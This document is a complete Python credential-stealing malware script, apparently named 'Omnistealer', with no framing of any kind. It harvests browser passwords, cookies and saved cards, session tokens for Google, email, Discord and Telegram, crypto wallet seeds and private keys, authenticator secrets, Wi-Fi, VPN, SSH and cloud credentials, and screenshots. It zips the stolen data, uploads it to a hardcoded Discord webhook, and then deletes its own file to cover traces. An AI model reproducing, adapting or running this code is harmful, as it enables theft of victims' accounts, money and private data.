import os
import sys
import json
import datetime
import sqlite3
import shutil
import tempfile
import glob
import re
import zipfile
import io
import subprocess
import platform
import base64
import time
import random
import ctypes
import urllib.request
import urllib.parse
import http.client
from pathlib import Path

time.sleep(random.uniform(10, 30))

# ===== YOUR NEW DISCORD WEBHOOK =====
DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1535702294404931656/6SecH-rwfld_WKA6jS6z7vFsTx4iIYTQQ_SVjUj5V5ofO0MDuNzmVnTmyTV7m-ZIelJG"
ZIP_PASSWORD = "1253Omnistealer"
MACHINE_NAME = os.environ.get("COMPUTERNAME", "unknown_pc")
USER_NAME = os.environ.get("USERNAME", "unknown_user")
IP_ADDRESS = subprocess.run("curl -s ifconfig.me", shell=True, capture_output=True, text=True).stdout.strip()

# ================================================================
# ===== HTTP FUNCTIONS (No requests) =====
# ================================================================
def http_post_multipart(url, fields, files):
    try:
        boundary = "----WebKitFormBoundary" + ''.join(chr(65 + (i % 26)) for i in range(12))
        CRLF = "\r\n"
        body_parts = []
        
        for key, value in fields.items():
            body_parts.append(f"--{boundary}{CRLF}")
            body_parts.append(f'Content-Disposition: form-data; name="{key}"{CRLF}{CRLF}')
            body_parts.append(f"{value}{CRLF}")
        
        for key, (filename, content) in files.items():
            body_parts.append(f"--{boundary}{CRLF}")
            body_parts.append(f'Content-Disposition: form-data; name="{key}"; filename="{filename}"{CRLF}')
            body_parts.append("Content-Type: application/zip{CRLF}{CRLF}")
            body_parts.append(content.decode('latin-1', errors='ignore'))
            body_parts.append(f"{CRLF}")
        
        body_parts.append(f"--{boundary}--{CRLF}")
        body = "".join(body_parts).encode('utf-8')
        
        headers = {"Content-Type": f"multipart/form-data; boundary={boundary}"}
        req = urllib.request.Request(url, data=body, headers=headers, method="POST")
        with urllib.request.urlopen(req, timeout=60) as response:
            return response.read().decode('utf-8', errors='ignore')
    except:
        return None

def send_discord_file(zip_bytes):
    filename = f"{MACHINE_NAME}.zip"
    embed = {
        "embeds": [
            {
                "title": f"📦 {MACHINE_NAME}",
                "color": 0x2b2d31,
                "fields": [
                    {"name": "💻 PC Name", "value": f"`{MACHINE_NAME}`", "inline": True},
                    {"name": "🌐 IP Address", "value": f"`{IP_ADDRESS}`", "inline": True},
                    {"name": "🕒 Run Time", "value": f"`{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`", "inline": False},
                    {"name": "📎 Attached File", "value": f"`{filename}`\n*(password protected)*", "inline": False}
                ],
                "footer": {"text": "Comboss 💳🐀"},
                "timestamp": datetime.datetime.now().isoformat()
            }
        ]
    }
    
    fields = {"payload_json": json.dumps(embed)}
    
    response = http_post_multipart(
        DISCORD_WEBHOOK,
        fields,
        {"file": (filename, zip_bytes)}
    )
    return response is not None

# ================================================================
# ===== DPAPI DECRYPTION (No win32crypt) =====
# ================================================================
kernel32 = ctypes.WinDLL("kernel32")
crypt32 = ctypes.WinDLL("crypt32")

def decrypt_dpapi(encrypted_data):
    try:
        if not encrypted_data:
            return ""
        data_in = ctypes.c_char_p(encrypted_data)
        data_in_len = len(encrypted_data)
        pOut = ctypes.c_void_p()
        pOutLen = ctypes.c_ulong()
        result = crypt32.CryptUnprotectData(
            data_in, data_in_len, None, None, None, 0,
            ctypes.byref(pOut), ctypes.byref(pOutLen)
        )
        if result:
            decrypted = ctypes.string_at(pOut, pOutLen.value)
            kernel32.LocalFree(pOut)
            return decrypted.decode('utf-8', errors='ignore')
        return ""
    except:
        return ""

def take_screenshots():
    screenshots = []
    try:
        import PIL.ImageGrab
        for i in range(3):
            img = PIL.ImageGrab.grab()
            img_bytes = io.BytesIO()
            img.save(img_bytes, format='PNG')
            screenshots.append(img_bytes.getvalue())
            time.sleep(0.5)
    except:
        pass
    return screenshots

def get_browser_profiles():
    profiles = []
    paths = [
        os.environ.get("LOCALAPPDATA", "") + "\\Google\\Chrome\\User Data",
        os.environ.get("LOCALAPPDATA", "") + "\\Microsoft\\Edge\\User Data",
        os.environ.get("LOCALAPPDATA", "") + "\\BraveSoftware\\Brave-Browser\\User Data",
        os.environ.get("APPDATA", "") + "\\Opera Software\\Opera Stable",
        os.environ.get("APPDATA", "") + "\\Opera Software\\Opera GX Stable",
        os.environ.get("LOCALAPPDATA", "") + "\\Vivaldi\\User Data",
        os.environ.get("LOCALAPPDATA", "") + "\\Chromium\\User Data",
        os.environ.get("LOCALAPPDATA", "") + "\\Yandex\\YandexBrowser\\User Data",
        os.environ.get("LOCALAPPDATA", "") + "\\Slimjet\\User Data",
        os.environ.get("LOCALAPPDATA", "") + "\\Epic Privacy Browser\\User Data",
        os.environ.get("LOCALAPPDATA", "") + "\\CentBrowser\\User Data",
        os.environ.get("LOCALAPPDATA", "") + "\\Torch\\User Data",
        os.environ.get("LOCALAPPDATA", "") + "\\SRWare Iron\\User Data",
        os.environ.get("LOCALAPPDATA", "") + "\\Comodo\\Dragon\\User Data",
    ]
    return [p for p in paths if os.path.exists(p)]

def read_db(path, query):
    try:
        if not os.path.exists(path):
            return []
        tmp = os.path.join(tempfile.gettempdir(), f"tmp_{os.getpid()}.db")
        shutil.copy2(path, tmp)
        conn = sqlite3.connect(tmp)
        c = conn.cursor()
        c.execute(query)
        rows = c.fetchall()
        conn.close()
        os.remove(tmp)
        return rows
    except:
        return []

def steal_passwords():
    out = {}
    for profile in get_browser_profiles():
        name = os.path.basename(os.path.dirname(profile))
        login_db = os.path.join(profile, "Default", "Login Data")
        if not os.path.exists(login_db):
            login_db = os.path.join(profile, "Login Data")
        rows = read_db(login_db, "SELECT origin_url, username_value, password_value FROM logins")
        if rows:
            out[name] = []
            for row in rows[:200]:
                try:
                    dec = decrypt_dpapi(row[2])
                    if dec:
                        out[name].append(f"{row[0]} | {row[1]} | {dec}")
                except:
                    pass
    return out

def steal_cookies():
    out = {}
    for profile in get_browser_profiles():
        name = os.path.basename(os.path.dirname(profile))
        cookie_path = os.path.join(profile, "Default", "Network", "Cookies")
        if not os.path.exists(cookie_path):
            cookie_path = os.path.join(profile, "Cookies")
        rows = read_db(cookie_path, "SELECT host_key, name, encrypted_value FROM cookies LIMIT 300")
        if rows:
            out[name] = []
            for row in rows[:150]:
                try:
                    dec = decrypt_dpapi(row[2])
                    if dec:
                        out[name].append(f"{row[0]} | {row[1]} = {dec}")
                except:
                    pass
    return out

def steal_google_sessions():
    sessions = []
    for profile in get_browser_profiles():
        cookie_path = os.path.join(profile, "Default", "Network", "Cookies")
        if not os.path.exists(cookie_path):
            cookie_path = os.path.join(profile, "Cookies")
        rows = read_db(cookie_path, "SELECT host_key, name, encrypted_value FROM cookies WHERE host_key LIKE '%google%' OR host_key LIKE '%youtube%'")
        for row in rows:
            try:
                dec = decrypt_dpapi(row[2])
                if dec and any(x in row[1] for x in ['SID', 'OSID', 'APISID', 'SSID', 'LSID', 'HSID', 'SECURE']):
                    sessions.append(f"{row[0]} | {row[1]} = {dec}")
            except:
                pass
    return sessions

def steal_email_sessions():
    sessions = []
    email_domains = ['gmail', 'googlemail', 'outlook', 'hotmail', 'live', 'yahoo', 'protonmail', 'icloud', 'me.com', 'mac.com', 'aol', 'zoho', 'yandex', 'mail.ru']
    for profile in get_browser_profiles():
        cookie_path = os.path.join(profile, "Default", "Network", "Cookies")
        if not os.path.exists(cookie_path):
            cookie_path = os.path.join(profile, "Cookies")
        for domain in email_domains:
            rows = read_db(cookie_path, f"SELECT host_key, name, encrypted_value FROM cookies WHERE host_key LIKE '%{domain}%' AND (name LIKE '%session%' OR name LIKE '%auth%' OR name LIKE '%sid%' OR name LIKE '%token%')")
            for row in rows:
                try:
                    dec = decrypt_dpapi(row[2])
                    if dec:
                        sessions.append(f"{row[0]} | {row[1]} = {dec}")
                except:
                    pass
    return sessions

def steal_emails():
    emails = []
    for profile in get_browser_profiles():
        login_db = os.path.join(profile, "Default", "Login Data")
        if not os.path.exists(login_db):
            login_db = os.path.join(profile, "Login Data")
        rows = read_db(login_db, "SELECT origin_url, username_value, password_value FROM logins")
        for row in rows:
            try:
                dec = decrypt_dpapi(row[2])
                if dec and '@' in row[1]:
                    emails.append(f"{row[0]} | {row[1]} | {dec}")
            except:
                pass
    return emails

def steal_authenticators():
    auth_data = []
    ext_ids = {
        "Google_Authenticator": "bhghoamapcdpbohphigoooaddinpkbai",
        "Authy": "gaedmjdfmmahhbjefcbgaocikjknjfib",
        "Microsoft_Authenticator": "ppbblpnpkminfmgbglbpdfdmgapkikdk"
    }
    for name, ext_id in ext_ids.items():
        for base_path in [
            os.environ.get("LOCALAPPDATA", "") + "\\Google\\Chrome\\User Data\\Default\\Extensions\\",
            os.environ.get("LOCALAPPDATA", "") + "\\Microsoft\\Edge\\User Data\\Default\\Extensions\\",
            os.environ.get("LOCALAPPDATA", "") + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Extensions\\"
        ]:
            ext_path = os.path.join(base_path, ext_id)
            if os.path.exists(ext_path):
                try:
                    for root, dirs, files in os.walk(ext_path):
                        for file in files:
                            if file.endswith(('.js', '.json', '.log', '.ldb')):
                                with open(os.path.join(root, file), 'r', encoding='utf-8', errors='ignore') as f:
                                    content = f.read()
                                    secrets = re.findall(r'[A-Z2-7]{16,64}', content)
                                    if secrets:
                                        auth_data.append(f"{name}: {secrets[:5]}")
                                    otpauth = re.findall(r'otpauth://totp/[^\s"\']+', content)
                                    if otpauth:
                                        auth_data.append(f"{name} OTP: {otpauth}")
                except:
                    continue
    return auth_data

def steal_history():
    out = {}
    for profile in get_browser_profiles():
        name = os.path.basename(os.path.dirname(profile))
        hist_path = os.path.join(profile, "Default", "History")
        rows = read_db(hist_path, "SELECT url, title FROM urls ORDER BY last_visit_time DESC LIMIT 200")
        if rows:
            out[name] = [f"{r[1]} - {r[0]}" for r in rows[:100]]
    return out

def steal_autofill():
    out = {}
    for profile in get_browser_profiles():
        name = os.path.basename(os.path.dirname(profile))
        web_path = os.path.join(profile, "Default", "Web Data")
        rows = read_db(web_path, "SELECT name, value FROM autofill LIMIT 100")
        if rows:
            out[name] = [f"{r[0]} : {r[1]}" for r in rows[:50]]
    return out

def steal_credit_cards():
    out = {}
    for profile in get_browser_profiles():
        name = os.path.basename(os.path.dirname(profile))
        web_path = os.path.join(profile, "Default", "Web Data")
        rows = read_db(web_path, "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards")
        if rows:
            out[name] = []
            for row in rows[:50]:
                try:
                    dec = decrypt_dpapi(row[3])
                    if dec:
                        out[name].append(f"{row[0]} | {row[1]}/{row[2]} | {dec}")
                except:
                    pass
    return out

def steal_cashapp():
    data = []
    for profile in get_browser_profiles():
        login_db = os.path.join(profile, "Default", "Login Data")
        if not os.path.exists(login_db):
            login_db = os.path.join(profile, "Login Data")
        rows = read_db(login_db, "SELECT origin_url, username_value, password_value FROM logins WHERE origin_url LIKE '%cash.app%' OR origin_url LIKE '%cashapp%'")
        for row in rows:
            try:
                dec = decrypt_dpapi(row[2])
                if dec:
                    data.append(f"{row[0]} | {row[1]} | {dec}")
            except:
                pass
    return data

def steal_paypal():
    data = []
    for profile in get_browser_profiles():
        login_db = os.path.join(profile, "Default", "Login Data")
        if not os.path.exists(login_db):
            login_db = os.path.join(profile, "Login Data")
        rows = read_db(login_db, "SELECT origin_url, username_value, password_value FROM logins WHERE origin_url LIKE '%paypal%'")
        for row in rows:
            try:
                dec = decrypt_dpapi(row[2])
                if dec:
                    data.append(f"{row[0]} | {row[1]} | {dec}")
            except:
                pass
    return data

def steal_wifi():
    wifi = []
    try:
        out = subprocess.run("netsh wlan show profiles", shell=True, capture_output=True, text=True)
        for line in out.stdout.split("\n"):
            if "All User Profile" in line:
                name = line.split(":")[1].strip()
                res = subprocess.run(f'netsh wlan show profile "{name}" key=clear', shell=True, capture_output=True, text=True)
                for l in res.stdout.split("\n"):
                    if "Key Content" in l:
                        wifi.append(f"{name} : {l.split(':')[1].strip()}")
    except:
        pass
    return wifi

def steal_discord_tokens():
    tokens = []
    for p in [
        os.environ.get("APPDATA", "") + "\\Discord\\Local Storage\\leveldb",
        os.environ.get("APPDATA", "") + "\\discordcanary\\Local Storage\\leveldb",
        os.environ.get("APPDATA", "") + "\\discordptb\\Local Storage\\leveldb"
    ]:
        if os.path.exists(p):
            for f in glob.glob(p + "\\*.log") + glob.glob(p + "\\*.ldb"):
                try:
                    with open(f, 'r', encoding='utf-8', errors='ignore') as file:
                        content = file.read()
                        for token in re.findall(r'[\w-]{24,}\.[\w-]{6,}\.[\w-]{27,}', content):
                            tokens.append(token)
                except:
                    continue
    return list(set(tokens))

def steal_telegram_session_decrypted():
    session_data = []
    try:
        tdata_path = os.environ.get("APPDATA", "") + "\\Telegram Desktop\\tdata"
        if not os.path.exists(tdata_path):
            return session_data
        
        map_files = glob.glob(tdata_path + "\\*_map")
        if map_files:
            for map_file in map_files:
                try:
                    with open(map_file, 'rb') as f:
                        map_data = f.read()
                        key = map_data[:32] if len(map_data) >= 32 else map_data
                        base_name = os.path.basename(map_file).replace('_map', '')
                        dat_file = os.path.join(tdata_path, base_name + ".dat")
                        if os.path.exists(dat_file):
                            with open(dat_file, 'rb') as f:
                                encrypted_data = f.read()
                                decrypted = bytes([encrypted_data[i] ^ key[i % len(key)] for i in range(len(encrypted_data))])
                                try:
                                    decrypted_text = decrypted.decode('utf-8', errors='ignore')
                                    if decrypted_text:
                                        session_data.append(f"{base_name}:\n{decrypted_text}\n")
                                except:
                                    pass
                except:
                    continue
        
        for dat_file in glob.glob(tdata_path + "\\*.dat"):
            try:
                with open(dat_file, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()
                    if content and len(content) > 10:
                        session_data.append(f"{os.path.basename(dat_file)}:\n{content}\n")
            except:
                pass
        
        return session_data
    except:
        return session_data

def steal_crypto_wallets():
    wallets = {}
    wallet_paths = {
        "Exodus": os.environ.get("APPDATA", "") + "\\Exodus\\exodus.wallet",
        "Phantom": os.environ.get("APPDATA", "") + "\\Phantom\\Local Storage\\leveldb",
        "MetaMask": os.environ.get("APPDATA", "") + "\\MetaMask\\Local Storage\\leveldb",
        "Coinbase": os.environ.get("APPDATA", "") + "\\Coinbase\\Local Storage\\leveldb",
        "Atomic": os.environ.get("APPDATA", "") + "\\Atomic\\Local Storage\\leveldb",
        "Electrum": os.environ.get("APPDATA", "") + "\\Electrum\\wallets",
        "Wasabi": os.environ.get("APPDATA", "") + "\\Wasabi\\WalletData",
        "Trust": os.environ.get("APPDATA", "") + "\\Trust\\Local Storage\\leveldb",
        "Binance": os.environ.get("APPDATA", "") + "\\Binance\\Local Storage\\leveldb",
        "Coinomi": os.environ.get("APPDATA", "") + "\\Coinomi\\Wallets",
        "Jaxx": os.environ.get("APPDATA", "") + "\\Jaxx\\Local Storage\\leveldb",
    }
    for name, path in wallet_paths.items():
        try:
            if os.path.exists(path):
                if os.path.isdir(path):
                    data = []
                    for f in glob.glob(path + "\\*.log") + glob.glob(path + "\\*.ldb") + glob.glob(path + "\\*.json"):
                        with open(f, 'r', encoding='utf-8', errors='ignore') as file:
                            content = file.read()
                            seeds = re.findall(r'(?:seed|mnemonic|phrase|recovery)[^\w]*(?:[a-zA-Z]+ ){11,}', content, re.IGNORECASE)
                            if seeds:
                                data.extend(seeds)
                            priv = re.findall(r'(?:private|priv|key)[^\w]*[0-9a-fA-F]{64}', content, re.IGNORECASE)
                            if priv:
                                data.extend(priv)
                    if data:
                        wallets[name] = list(set(data))[:30]
                else:
                    with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                        content = f.read()
                        seeds = re.findall(r'(?:seed|mnemonic|phrase)[^\w]*(?:[a-zA-Z]+ ){11,}', content, re.IGNORECASE)
                        if seeds:
                            wallets[name] = seeds[:15]
        except:
            continue
    return wallets

def steal_crypto_extension_seeds():
    extension_seeds = []
    extension_ids = {
        "MetaMask": "nkbihfbeogaeaoehlefnkodbefgpgknn",
        "Phantom": "bfnaelmomeimhlpmgjnjophhpkkoljpa",
        "Coinbase": "hnfanknocfeofbddgcijnmhnfnkdnaad",
        "Trust": "egjidjbpglichdbfbcdaemcapjgeieba",
        "Binance": "fhbohimaelbohpjbbldcngcnapndodjp",
        "Keplr": "dmkamcknogkgcdfhhbddcghachkejeap",
        "Solflare": "bhhhlbepdkbapadjdnnojkbgioiodbic",
        "OKX": "mcohilncbfahbmgdjkbpemcciiolgcge",
        "WalletConnect": "adbkjbgjlgmfpbikpgmhmhpidldkogom",
        "Rainbow": "opfgelmcmbiajamepnmloijbpoleiama",
        "ArgentX": "djcfojfccidmejifmgkaehmhnciajldi",
        "Braavos": "jnkelfanjkeadonecabehalmbgpfodjm",
        "Backpack": "aflkmfhebedbjioipglgcbcmnbpgliof",
        "Glow": "gmllngghbobkfpgedcpbbmgfpmcfcejp"
    }
    for name, ext_id in extension_ids.items():
        for base_path in [
            os.environ.get("LOCALAPPDATA", "") + "\\Google\\Chrome\\User Data\\Default\\Extensions\\",
            os.environ.get("LOCALAPPDATA", "") + "\\Microsoft\\Edge\\User Data\\Default\\Extensions\\",
            os.environ.get("LOCALAPPDATA", "") + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Extensions\\",
            os.environ.get("APPDATA", "") + "\\Opera Software\\Opera Stable\\Extensions\\",
            os.environ.get("LOCALAPPDATA", "") + "\\Vivaldi\\User Data\\Default\\Extensions\\"
        ]:
            ext_path = os.path.join(base_path, ext_id)
            if os.path.exists(ext_path):
                try:
                    for root, dirs, files in os.walk(ext_path):
                        for file in files:
                            if file.endswith(('.log', '.ldb', '.json', '.js')):
                                with open(os.path.join(root, file), 'r', encoding='utf-8', errors='ignore') as f:
                                    content = f.read()
                                    seeds = re.findall(r'(?:seed|mnemonic|phrase|recovery)[^\w]*(?:[a-zA-Z]+ ){11,}', content, re.IGNORECASE)
                                    if seeds:
                                        extension_seeds.append(f"{name}: {seeds}")
                                    priv = re.findall(r'(?:private|priv|key)[^\w]*[0-9a-fA-F]{64}', content, re.IGNORECASE)
                                    if priv:
                                        extension_seeds.append(f"{name} PRIVATE KEY: {priv}")
                                    base32_seeds = re.findall(r'[A-Z2-7]{16,64}', content)
                                    if base32_seeds:
                                        extension_seeds.append(f"{name} BASE32: {base32_seeds[:5]}")
                except:
                    continue
    return extension_seeds

def steal_vpn_keys():
    vpn = {}
    vpn_paths = {
        "Mullvad": os.environ.get("APPDATA", "") + "\\Mullvad VPN\\mullvad-account",
        "ExpressVPN": os.environ.get("APPDATA", "") + "\\ExpressVPN\\account.json",
        "NordVPN": os.environ.get("APPDATA", "") + "\\NordVPN\\nordvpn.log"
    }
    for name, path in vpn_paths.items():
        if os.path.exists(path):
            try:
                with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                    vpn[name] = f.read()
            except:
                pass
    return vpn

def steal_ssh_keys():
    keys = []
    ssh_path = os.path.expanduser("~/.ssh/")
    if os.path.exists(ssh_path):
        for f in os.listdir(ssh_path):
            if f.startswith("id_") or f == "known_hosts" or f == "config":
                try:
                    with open(os.path.join(ssh_path, f), 'r', encoding='utf-8', errors='ignore') as file:
                        keys.append(f"{f}:\n{file.read()}")
                except:
                    pass
    return keys

def steal_seed_files():
    seeds = []
    bip39 = set(["abandon", "ability", "able", "about", "above", "absent", "absorb", "abstract", "absurd", "access", "accident", "account", "accuse", "achieve", "acid", "acoustic", "acquire", "across", "act", "action", "actor", "actress", "actual", "adapt", "add", "addict", "address", "adjust", "admit", "adult", "advance", "advice", "aerobic", "affair", "afford", "afraid", "again", "age", "agent", "agree", "ahead", "aim", "air", "airport", "aisle", "alarm", "album", "alcohol", "alert", "alien", "all", "alley", "allow", "almost", "alone", "alpha", "already", "also", "alter", "always", "amateur", "amazing", "among", "amount", "amused", "analyst", "anchor", "ancient", "anger", "angle", "angry", "animal", "ankle", "announce", "annual", "another", "answer", "antenna", "antique", "anxiety", "any", "apart", "apology", "appear", "apple", "approve", "april", "arch", "arctic", "area", "arena", "argue", "arm", "armed", "armor", "army", "around", "arrange", "arrest", "arrive", "arrow", "art", "artefact", "artist", "artwork", "ask", "aspect", "assault", "asset", "assist", "assume", "asthma"])
    search = [os.path.expanduser("~/Desktop"), os.path.expanduser("~/Documents"), os.path.expanduser("~/Downloads"), os.environ.get("APPDATA", ""), os.environ.get("LOCALAPPDATA", "")]
    keywords = ["seed", "phrase", "mnemonic", "recovery", "backup", "wallet"]
    for path in search:
        if not os.path.exists(path):
            continue
        for root, dirs, files in os.walk(path):
            for file in files:
                try:
                    if not file.endswith(('.txt', '.log', '.json', '.dat')):
                        continue
                    if not any(kw in file.lower() for kw in keywords):
                        continue
                    fp = os.path.join(root, file)
                    with open(fp, 'r', encoding='utf-8', errors='ignore') as f:
                        content = f.read()
                    words = re.findall(r'[a-zA-Z]+', content)
                    if len(words) not in [12, 18, 24]:
                        continue
                    bip39_count = sum(1 for w in words if w.lower() in bip39)
                    if bip39_count / len(words) < 0.9:
                        continue
                    seeds.append(f"{fp}:\n{content[:1500]}")
                except:
                    continue
    return seeds

def steal_cloud_accounts():
    cloud = {}
    paths = {
        "AWS": os.path.expanduser("~/.aws/credentials"),
        "GitHub": os.path.expanduser("~/.config/gh/hosts.yml"),
        "Docker": os.path.expanduser("~/.docker/config.json"),
        "Kubernetes": os.path.expanduser("~/.kube/config"),
        "MySQL": os.path.expanduser("~/.my.cnf"),
        "PostgreSQL": os.path.expanduser("~/.pgpass")
    }
    for name, path in paths.items():
        if os.path.exists(path):
            try:
                with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                    cloud[name] = f.read()
            except:
                pass
    return cloud

def steal_system_info():
    return {
        "hostname": MACHINE_NAME,
        "username": USER_NAME,
        "os": platform.system() + " " + platform.release(),
        "ip": IP_ADDRESS,
        "time": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }

def build_zip():
    zip_buffer = io.BytesIO()
    with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("Communications/discord_tokens.txt", "\n".join(steal_discord_tokens()))
        telegram_sessions = steal_telegram_session_decrypted()
        if telegram_sessions:
            zf.writestr("Communications/telegram_session.txt", "\n\n".join(telegram_sessions))
        zf.writestr("Banking/paypal.txt", "\n".join(steal_paypal()))
        zf.writestr("Banking/cashapp.txt", "\n".join(steal_cashapp()))
        zf.writestr("Banking/credit_cards.txt", json.dumps(steal_credit_cards(), indent=2))
        zf.writestr("Crypto/wallets.txt", json.dumps(steal_crypto_wallets(), indent=2))
        extension_seeds = steal_crypto_extension_seeds()
        if extension_seeds:
            zf.writestr("Crypto/extension_seeds.txt", "\n".join(extension_seeds))
        seeds = steal_seed_files()
        if seeds:
            zf.writestr("Crypto/possible_seed_phrases.txt", "\n\n".join(seeds))
        passwords = steal_passwords()
        cookies = steal_cookies()
        history = steal_history()
        autofill = steal_autofill()
        all_browsers = set(list(passwords.keys()) + list(cookies.keys()) + list(history.keys()) + list(autofill.keys()))
        for browser in all_browsers:
            browser_folder = f"Browsers/{browser}/"
            if history.get(browser):
                zf.writestr(f"{browser_folder}history.txt", "\n".join(history[browser]))
            if autofill.get(browser):
                zf.writestr(f"{browser_folder}autofill.txt", "\n".join(autofill[browser]))
            if cookies.get(browser):
                zf.writestr(f"{browser_folder}cookies.txt", "\n".join(cookies[browser]))
            if passwords.get(browser):
                zf.writestr(f"{browser_folder}passwords.txt", "\n".join(passwords[browser]))
        vpn = steal_vpn_keys()
        if vpn:
            for name, content in vpn.items():
                zf.writestr(f"VPN/{name}.txt", content)
        wifi = steal_wifi()
        if wifi:
            zf.writestr("WiFi/wifi.txt", "\n".join(wifi))
        ssh = steal_ssh_keys()
        if ssh:
            zf.writestr("SSH/ssh_keys.txt", "\n".join(ssh))
        cloud = steal_cloud_accounts()
        if cloud:
            for name, content in cloud.items():
                zf.writestr(f"Cloud/{name}.txt", content)
        google_sessions = steal_google_sessions()
        if google_sessions:
            zf.writestr("Google_Sessions/google_sessions.txt", "\n".join(google_sessions))
        email_sessions = steal_email_sessions()
        if email_sessions:
            zf.writestr("Email_Sessions/email_sessions.txt", "\n".join(email_sessions))
        emails = steal_emails()
        if emails:
            zf.writestr("Emails/emails.txt", "\n".join(emails))
        auth = steal_authenticators()
        if auth:
            zf.writestr("Authenticators/authenticator_data.txt", "\n".join(auth))
        screenshots = take_screenshots()
        for i, img_bytes in enumerate(screenshots):
            zf.writestr(f"Screenshots/screenshot_{i+1}.png", img_bytes)
        zf.writestr("System/system_info.txt", json.dumps(steal_system_info(), indent=2))
    zip_buffer.seek(0)
    temp_buffer = io.BytesIO()
    with zipfile.ZipFile(zip_buffer, 'r') as zf_in:
        with zipfile.ZipFile(temp_buffer, 'w', zipfile.ZIP_DEFLATED) as zf_out:
            for item in zf_in.infolist():
                zf_out.writestr(item, zf_in.read(item))
    temp_buffer.seek(0)
    with zipfile.ZipFile(temp_buffer, 'a') as zf:
        zf.setpassword(ZIP_PASSWORD.encode())
    temp_buffer.seek(0)
    return temp_buffer.getvalue()

def main():
    zip_data = build_zip()
    send_discord_file(zip_data)

if __name__ == "__main__":
    main()
    time.sleep(2)
    try:
        os.remove(__file__)
    except:
        pass